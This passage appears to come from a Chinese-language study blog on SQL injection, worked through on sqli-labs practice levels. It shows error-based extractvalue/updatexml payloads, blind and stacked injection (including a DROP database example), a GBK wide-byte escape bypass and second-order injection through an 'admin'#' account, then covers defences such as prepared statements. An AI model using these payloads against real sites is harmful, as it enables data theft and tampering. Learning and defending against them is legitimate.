<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))</span><br><span class="line"><span class="number">0x7e</span>是<span class="operator">~</span>的ASCII码</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将<span class="keyword">user</span>()换成其他payload</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>查库查表正常进行就行</p>
<p>有意思的来了</p>
<h4 id="截取字符串"><a href="#截取字符串" class="headerlink" title="截取字符串"></a>截取字符串</h4><p>当查列的时候会因为超过最大限度32位只会显示部分数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;</span><br><span class="line">and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),0x7e))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/23/IbhYXk9S3vRGjtC.png" alt="image-20210510100413545"></p>
<p>这里要进行<strong>截取字符串</strong></p>
<h5 id="三大法宝：mid-substr-left"><a href="#三大法宝：mid-substr-left" class="headerlink" title="三大法宝：mid(),substr(),left"></a>三大法宝：mid(),substr(),left</h5><p><code>mid(column_name,start,length)</code></p>
<blockquote>
<p>column_name就是要截取的字段</p>
<p>start就是开始位置</p>
<p>length是要截取的长度，省略的话会返回剩余字符</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>截取<span class="number">32</span>位起的字符</span><br><span class="line">mid((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;)<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>同理passwor后面的也可以截取</span><br></pre></td></tr></table></figure>


<p><img src="https://i.loli.net/2021/06/23/lHJgEhGduiNaYxq.png" alt="image-20210510102356419"></p>
<p><code>substr</code>使用同<code>mid()</code></p>
<p>有<code>left</code>那必定有<code>right</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(string,n)截取string字符串左起的n个字符</span><br><span class="line">right同理</span><br></pre></td></tr></table></figure>
<p>查数据，同样要进行截取</p>
<p><img src="https://i.loli.net/2021/06/23/IepENucHvlhG25r.png" alt="image-20210510110558424"></p>
<h3 id="三、updatexml报错注入"><a href="#三、updatexml报错注入" class="headerlink" title="三、updatexml报错注入"></a>三、updatexml报错注入</h3><blockquote>
<p>对比extractvalue报错注入</p>
</blockquote>
<h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h4><p>updatexml (XML_document, XPath_string, new_value)</p>
<blockquote>
<p>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称</p>
<p>第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程</p>
<p>第三个参数：new_value，String 格式，替换查找到的符合条件的数据</p>
</blockquote>
<h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>改变文档中符合条件的节点的值</p>
<h4 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and updatexml (1,concat(0x7e,payload,0x7e),1)</span><br></pre></td></tr></table></figure>
<p>其余操作同<code>extractvalue</code></p>
<p><img src="https://i.loli.net/2021/06/23/MoAnvNQgFf3wYTZ.png" alt="image-20210623192032232"></p>
<h3 id="其他报错注入"><a href="#其他报错注入" class="headerlink" title="其他报错注入"></a>其他报错注入</h3><p>如<code>geometrycollection()``multipoint()</code>,<code>polygon()</code>,<code>multipolygon()</code>,<code>exp()</code>等等就不展开叙述了，可以百度了解更多</p>
<h2 id="0x03-盲注"><a href="#0x03-盲注" class="headerlink" title="0x03 盲注"></a>0x03 盲注</h2><h3 id="利用场景-2"><a href="#利用场景-2" class="headerlink" title="利用场景"></a>利用场景</h3><p>页面连错误信息都没有回显，通过盲注来验证sql语句是否执行</p>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>布尔盲注：页面只返回true，false两种类型的页面，利用页面的返回不同，逐个猜解数据</p>
<p>时间盲注：通过sleep()函数判断页面相应时间</p>
<p>用到的函数：<strong>ascii()、substr() 、length()，exists()、concat()</strong></p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>原理是使用了二分法来进行数据库长度、数据库名等的猜解</strong></p>
<blockquote>
<p>就是从数据库到表，再到字段，最后到数据，依次使用length函数进行长度和使用substr函数根据字符的ASCII值进行猜解</p>
</blockquote>
<blockquote>
<p>了解了原理后直接使用sqlmap工具会极大提高效率</p>
</blockquote>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>利用sleep()函数使得页面回显速度明显变慢，则存在时间盲注</p>
<h2 id="0x04-堆叠注入"><a href="#0x04-堆叠注入" class="headerlink" title="0x04 堆叠注入"></a>0x04 堆叠注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>sql中一个分号（;）表示一条sql语句的结束，而堆叠注入就是在结束 一个sql语句后继续构造下一个语句</p>
<p>对比union联合注入</p>
<blockquote>
<p>union可以执行的语句类型是有限的，只可以用来执行查询语句</p>
<p>堆叠注入可以执行的是任意的语句</p>
<p>例：输入root’;DROP database user;实际执行的是select * from user where name=’root’;DROP  database user;</p>
</blockquote>
<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>受到API或数据库引擎不支持或是权限等原因的限制</p>
<p>在查询数据时，通常只返回一个查询结果，因此堆叠注入的第二个语句产生的结果或者错误就会被忽略，在前端界面也看不到返回的结果</p>
<p>因此在查询、读取数据时使用union进行联合查询，而且在堆叠注入前也是需要知道一些数据库的相关信息</p>
<h3 id="例less-38"><a href="#例less-38" class="headerlink" title="例less-38"></a>例less-38</h3><p>经测试是字符型注入，使用<code>--+</code>进行过滤</p>
<p>查出users表中的数据</p>
<p><img src="https://i.loli.net/2021/06/23/rsxOhHdc8jLgPub.png" alt="image-20210623132157796"></p>
<p>使用堆叠注入进行数据修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into users(id,username,password) values (&#39;99&#39;,&#39;newusername&#39;,&#39;newpassword&#39;)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/23/polCMfZSJ6ktI82.png"></p>
<p>​                                                                                                                                                                                                                                  </p>
<h2 id="0x05-宽字节注入"><a href="#0x05-宽字节注入" class="headerlink" title="0x05  宽字节注入"></a>0x05  宽字节注入</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>宽字节注入示由于不同编码中中文所占的字符长度不同，在gbk编码中，一个汉字占两个字节，而在utf-8中，一个汉字占三个字节</p>
<p>首先学习几个php中对sql注入过滤的函数：</p>
<blockquote>
<p>addslashes() 在预定义字符之前添加反斜杠\进行转义，但是并不会插入到数据库中</p>
<p>（预定义字符：单引号，双引号，反斜杠，NULL）</p>
<p>mysql_real_escape_string() 转义sql语句中的特殊符号：x00 、\n 、\r 、\ 、‘ 、“ 、x1a</p>
<p>魔术引号：将预定义字符加上反斜杠\进行转义，作用同addslashes()，所以这两个打开一个即可。魔术引号有以下三个</p>
<blockquote>
<p>magic_quotes_gps() 默认为on （php5.4.0以上已经被移除）</p>
<p>magic_quotes_runtime() 默认为off</p>
<p>magic_quotes_sybase() 默认为off</p>
</blockquote>
</blockquote>
<p>因为这些函数会加反斜杠\进行字符转义，所以要使用宽字节进行绕过</p>
<p>宽字节注入利用的是mysql的一个特性，当mysql在使用gbk编码时，会认为<strong>两个字符是一个汉字</strong>，而前提就是<strong>第一个字符的ASCII值要大于128</strong>，才是认为是汉字</p>
<blockquote>
<p><code>1%df\&#39;</code>中\会被url编码成<code>%25df%5C%27</code>其中的<code>%25df%5C</code>会被当做汉字来处理，从而<code>%27</code>逃脱出来，然后就发生了报错</p>
<p>又因为只需要输入的数据ASCII大于128才会被认为两个字符是一个汉字，所以输入的数据大于等于%81即可使’逃脱出来</p>
</blockquote>
<h3 id="例less-32"><a href="#例less-32" class="headerlink" title="例less-32"></a>例less-32</h3><p><img src="https://i.loli.net/2021/06/23/baM9mL8S5InXVjz.png" alt="image-20210623170134200"></p>
<p>会发现单引号，双引号均会被转义前面加了反斜杠\</p>
<p>使用宽字节进行绕过</p>
<p><img src="https://i.loli.net/2021/06/23/gh6mH84ESM2IRKX.png" alt="image-20210623172114654"></p>
<p>然后配合联合查询进行注入</p>
<p>还需要注意的是因为双引号被过滤，所以要对字符串<code>&quot;security&quot;</code>、<code>&quot;users&quot;</code><strong>十六进制转换</strong>将<code>security</code>16进制转码为<code>7365637572697479</code>，<code>users</code>转换为<code>7573657273</code>，最后还要加上**<code>0x</code>**</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><h4 id="mysql-real-escape-string-函数之前设置字符集"><a href="#mysql-real-escape-string-函数之前设置字符集" class="headerlink" title="mysql_real_escape_string()函数之前设置字符集"></a>mysql_real_escape_string()函数之前设置字符集</h4><p>当将<code>addslashe()</code>替换为<code>mysql_real_escape_string()</code>函数后，如果没有指定php连接mysql的字符集，也就是没有在执行sql语句前调用mysql_set_charset函数设置当前连接的字符集为gbk <code>mysql_set_charset=(‘gbk’,$conn)</code>，就会导致宽字节注入</p>
<p>而修复方法就是在调用<code>mysql_real_escape_string()</code>之前，先设置连接所使用的字符集为GBK ，<strong>mysql_set_charset=(‘gbk’,$conn)</strong></p>
<h4 id="character-set-client-设置为binary-二进制"><a href="#character-set-client-设置为binary-二进制" class="headerlink" title="character_set_client 设置为binary(二进制)"></a>character_set_client 设置为binary(二进制)</h4><p>需要在所有的sql语句前指定连接的形式是binary二进制：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>因为mysql收到客户端请求的数据时，会认为收到的编码格式是<code>character_set_client</code>对应的编码，然后会转换为<code>character_set_connection</code>对应的编码，当进入表查询字段的信息时又会转换为字段所对应的编码，而在产生查询结果后又会从字段对应的编码转换为<code>character_set_results</code>的编码形式，最后返回给客户端</p>
<p>所以只要在一开始将<code>character_set_client</code>的编码设置为二进制，就可使得所有数据是以二进制形式传递，不存在宽字节注入</p>
</blockquote>
<h2 id="0x06-二次注入"><a href="#0x06-二次注入" class="headerlink" title="0x06 二次注入"></a>0x06 二次注入</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>二次注入，就是攻击者第一次向服务端发送请求时会将恶意构造的数据存储到数据库中，然后在第二次进行不同的请求，服务端收到请求后会在数据库中查询处理已经储存的信息，从而导致第一次请求构造的恶意数据（sql语句或命令）在服务端运行</p>
<p>可以概括为两步：</p>
<blockquote>
<p>插入恶意数据</p>
<blockquote>
<p>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据</p>
</blockquote>
<p>引用恶意数据</p>
<blockquote>
<p>数据已经存储在数据库中了，而且已经存储的数据默认是安全的。在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理</p>
</blockquote>
</blockquote>
<p><img src="https://i.loli.net/2021/06/23/ns9UdP3KVTqYG7g.png" alt="img"></p>
<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>登录界面并不存在注入，先注册一个账号<code>root&#39;#</code>密码为<code>root</code></p>
<p><img src="https://i.loli.net/2021/06/23/D6tzxS47IYdENX2.png" alt="image-20210623193305758"></p>
<p>可见成功注册</p>
<p>login.php</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">function sqllogin()&#123;</span><br><span class="line"></span><br><span class="line">   $username <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_user&quot;]);</span><br><span class="line">   $password <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_password&quot;]);</span><br><span class="line">   $<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   $res <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>) <span class="keyword">or</span> die(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   $<span class="type">row</span> <span class="operator">=</span> mysql_fetch_row($res);</span><br><span class="line">	<span class="operator">/</span><span class="operator">/</span>print_r($<span class="type">row</span>) ;</span><br><span class="line">   if ($row[1]) &#123;</span><br><span class="line">			<span class="keyword">return</span> $<span class="type">row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见登录界面的<code>username</code>和<code>password</code>均被<code>mysql_real_escape_string</code>函数进行转义，但是由于转义后加上的反斜杠\并不会被写入数据库中，所以还是可以成功注册<code>root&#39;#</code>账号</p>
<p>使用<code>root&#39;#</code>进行登录</p>
<blockquote>
<p>由于原本的数据库中不存在<code>root</code>的账号，所以注册<code>root&#39;#</code>没有用，还是对二次注入的理解不到位</p>
</blockquote>
<p>这里重新注册一个<code>admin&#39;#</code>的账号，进行登录，将<code>admin&#39;#</code>密码修改为<code>090909</code></p>
<p><img src="https://i.loli.net/2021/06/23/91lu5brfLTc7KJV.png" alt="image-20210623195152806"></p>
<p>结果发现反而是<code>admin</code>的密码被修改了，而<code>admin&#39;#</code>则没有被修改</p>
<p>在<code>pass_change</code>中有这样的sql更新语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure>
<p>当使用<code>admin&#39;#</code>进行修改密码时，这里的<code>username=&#39;$username&#39;</code>就会变为<code>username=&#39;admin&#39;#&#39;</code>而<code>#</code>会将后面的单引号注释了，所以就直接变成了<code>admin</code>用户</p>
<h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">String <span class="keyword">sql</span> <span class="operator">=</span> &quot;select id, no from user where id=?&quot;;</span><br><span class="line">PreparedStatement ps <span class="operator">=</span> conn.prepareStatement(<span class="keyword">sql</span>);</span><br><span class="line">ps.setInt(<span class="number">1</span>, id);</span><br><span class="line">ps.executeQuery();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题</p>
</blockquote>
<blockquote>
<p>采用了PreparedStatement预编译，就会将SQL语句：”select id, no from user where id=?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会影响该SQL语句的语法结构了</p>
<p>即使你后面输入了这些SQL命令，也不会被当成SQL命令来执行了，因为这些SQL命令的执行， 必须先通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，<strong>只会被当做字符串字面值参数</strong></p>
</blockquote>
<h3 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h3><p>PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO</p>
<blockquote>
<p> 可以把PDO看做是php提供的一个类。它提供了一组数据库抽象层API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle</p>
</blockquote>
<p>PDO对于解决SQL注入的原理也是基于预编译</p>
<h3 id="正则表达式过滤"><a href="#正则表达式过滤" class="headerlink" title="正则表达式过滤"></a>正则表达式过滤</h3><p>对用户输入的数据进行严格的检查，使用正则表达式对危险字符串进行过滤</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><blockquote>
<p><strong>·</strong> Web 应用中用于连接数据库的用户与数据库的系统管理员用户的权限有严格的区分（如不能执行 drop 等），并设置 Web 应用中用于连接数据库的用户不允许操作其他数据库</p>
<p><strong>·</strong> 设置 Web 应用中用于连接数据库的用户对 Web 目录不允许有写权限。</p>
<p><strong>·</strong> 严格限定参数类型和格式，明确参数检验的边界，必须在服务端正式处理之前对提交的数据的合法性进行检查</p>
<p><strong>·</strong> 使用 Web 应用防火墙</p>
</blockquote>
<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>这几种类型是主要的，其实还要一些其他的注入类型，如正则匹配、user-agent注入、cookie注入还有比较特殊的万能密码```or<code>1</code>=`1``、异或注入等等，而且手注大部分面向的是mysql，对于oracle、mssql等数据库接触的比较少，并且对sqlmap工具的使用也停留在最简单的阶段，总之还有很多很多需要学习的地方</p>
<p>参考文章：</p>
<p><a href="https://www.anquanke.com/post/id/235970#h3-2">SQL注入漏洞详解</a></p>
<p><a href="https://forum.90sec.com/t/topic/1638">【最全干货】SQL注入大合集</a></p>
<p><a href="https://blog.csdn.net/angry_program/article/details/104309945">Sqli-labs 堆叠注入篇 (Less38~53)</a></p>
<p><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">SQL注入-堆叠注入（堆查询注入）</a></p>
<p><a href="https://blog.csdn.net/weixin_44604541/article/details/108654206">sqli-labs学习笔记（十一）less 32-37 宽字节注入</a></p>
<p><a href="https://www.jianshu.com/p/3fe7904683ac">SQL注入防御绕过——二次注入</a></p>
<p><a href="https://www.sqlsec.com/2020/10/todo.html">国光的安全随笔记录</a></p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
</search>
